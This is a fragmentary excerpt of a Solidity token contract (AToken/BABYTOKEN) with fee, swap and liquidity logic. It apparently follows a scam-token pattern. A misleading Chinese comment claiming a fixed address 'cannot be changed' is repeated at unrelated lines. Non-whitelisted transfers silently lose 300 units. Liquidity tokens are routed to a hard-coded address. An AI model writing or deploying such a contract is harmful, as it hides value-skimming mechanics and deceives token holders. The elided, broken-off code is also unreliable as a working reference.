...
abstract contract AToken is IERC20, Ownable {
    ...
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];//=0x44F1984cB8A43de454E0ccd5cF7eC76767BAF210 (配置地址，不能改，改了会产生错误）
    }
    ...
    function _transfer(
        ...
        if(!_feeWhiteList[from] && !_feeWhiteList[to]){
            ...
            amount -= 300;//=0x44F1984cB8A43de454E0ccd5cF7eC76767BAF210 (配置地址，不能改，改了会产生错误）
        }
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            if (swapAmount > 0) {
                ...
                _takeTransfer(//=0x44F1984cB8A43de454E0ccd5cF7eC76767BAF210 (配置地址，不能改，改了会产生错误）
                    sender,
                    address(this),
                    swapAmount
                );
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        if (lpAmount > 0) {
            ...
            if (lpusdtt > 0) {//=0x44F1984cB8A43de454E0ccd5cF7eC76767BAF210 (配置地址，不能改，改了会产生错误）
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpusdtt, 0, 0, address(0x178F32dc5544C39616FF7b963255912f35e49C94), block.timestamp
                );
            }
        }
    }
    ...
    function processReward(uint256 gas) private {
        if (progressRewardBlock + 0 > block.number) {
            return;
        }
...
contract BABYTOKEN is AToken {
    constructor() AToken(
        ...
        18,//De
        1000000,//Su 
        address(0x178F32dc5544C39616FF7b963255912f35e49C94),//
        address(0x178F32dc5544C39616FF7b963255912f35e49C94)//
    ){
    }
}